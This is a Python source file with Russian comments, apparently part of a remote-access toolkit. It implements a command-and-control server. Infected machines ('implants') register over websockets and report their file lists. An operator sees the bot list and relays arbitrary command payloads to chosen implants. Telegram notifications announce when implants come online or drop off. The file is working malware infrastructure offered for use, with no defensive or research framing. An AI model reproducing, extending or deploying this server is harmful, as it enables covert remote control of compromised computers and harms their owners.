# --- Файл: c2_server.py (Версия 6.0 - с защитой от разрыва соединения) ---
import asyncio
import json
import os
from aiohttp import web

from utils import send_telegram_message

IMPLANTS, OPERATOR = {}, None

async def safe_send(ws, data):
    """Безопасно отправляет JSON, перехватывая ошибки отключения клиента."""
    if ws and not ws.closed:
        try:
            await ws.send_json(data)
            return True
        except (ConnectionResetError, asyncio.CancelledError):
            # Эти ошибки нормальны, если клиент просто закрыл вкладку. Игнорируем.
            return False
    return False

async def broadcast_bot_list():
    """Безопасно транслирует список ботов оператору."""
    await safe_send(OPERATOR, {'type': 'bot_list', 'data': list(IMPLANTS.keys())})

async def websocket_handler(request):
    global OPERATOR, IMPLANTS
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    client_type, client_id = None, None
    peername = request.transport.get_extra_info('peername')
    client_ip = peername[0] if peername else "Unknown IP"

    try:
        initial_msg = await ws.receive_json(timeout=15.0)
        client_type = initial_msg.get('type')

        if client_type == 'operator':
            OPERATOR = ws
            print(f"[+] Оператор подключился с {client_ip}")
            await broadcast_bot_list()
        elif client_type == 'implant':
            client_id = initial_msg.get('id')
            if not client_id: raise ValueError("Имплант не предоставил ID")

            IMPLANTS[client_id] = {"ws": ws, "files": initial_msg.get('files', {}), "volume": initial_msg.get('current_volume', 50)}
            hostname = client_id.replace("implant_", "")
            print(f"[+] Имплант ОНЛАЙН: {client_id} ({client_ip})")
            send_telegram_message(f"✅ Имплант ОНЛАЙН: {hostname}")
            await broadcast_bot_list()
        else:
            raise ValueError(f"Неизвестный тип клиента: {client_type}")

        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT:
                if msg.data == 'ping': await ws.send_str('pong'); continue
                data = json.loads(msg.data)

                if client_type == 'operator':
                    target_id = data.get('target_id')
                    if data['type'] == 'command' and target_id in IMPLANTS:
                        await safe_send(IMPLANTS[target_id]["ws"], data['payload'])
                    elif data['type'] == 'get_details' and target_id in IMPLANTS:
                        details = {"files": IMPLANTS[target_id].get("files"), "volume": IMPLANTS[target_id].get("volume")}
                        await safe_send(OPERATOR, {'type': 'bot_details', 'bot_id': target_id, 'data': details})

                elif client_type == 'implant':
                    if data.get('type') == 'file_list_update':
                        if client_id in IMPLANTS:
                            IMPLANTS[client_id]["files"] = data.get('files', {})
                            await safe_send(OPERATOR, {'type': 'bot_details', 'bot_id': client_id, 'data': {"files": data.get('files')}})

    except Exception as e:
        # Логируем только неожиданные ошибки, а не обычные отключения
        if not isinstance(e, (asyncio.TimeoutError, ValueError, asyncio.CancelledError)):
             print(f"[!] Ошибка WebSocket от {client_id or client_ip}: {e.__class__.__name__} - {e}")

    finally:
        if client_type == 'implant' and client_id in IMPLANTS:
            del IMPLANTS[client_id]
            hostname = client_id.replace("implant_", "")
            print(f"[-] Имплант ОТКЛЮЧИЛСЯ: {client_id}")
            send_telegram_message(f"❌ Имплант ОТКЛЮЧИЛСЯ: {hostname}")
            await broadcast_bot_list()
        elif client_type == 'operator':
            OPERATOR = None
            print(f"[-] Оператор {client_ip} отключился.")
    return ws

async def http_handler(request):
    return web.FileResponse(os.path.join(os.path.dirname(__file__), 'index.html'))

async def main():
    app = web.Application()
    app.router.add_get('/', http_handler)
    app.router.add_get('/ws', websocket_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 10000)
    await site.start()
    print("====== C2 SERVER (V6.0 BULLETPROOF) ONLINE ======")
    send_telegram_message("🚀 Сервер запущен.")
    await asyncio.Event().wait()

if __name__ == "__main__":
    try: asyncio.run(main())
    except KeyboardInterrupt: print("\nСервер остановлен.")
    finally: send_telegram_message("🛑 Сервер остановлен.")
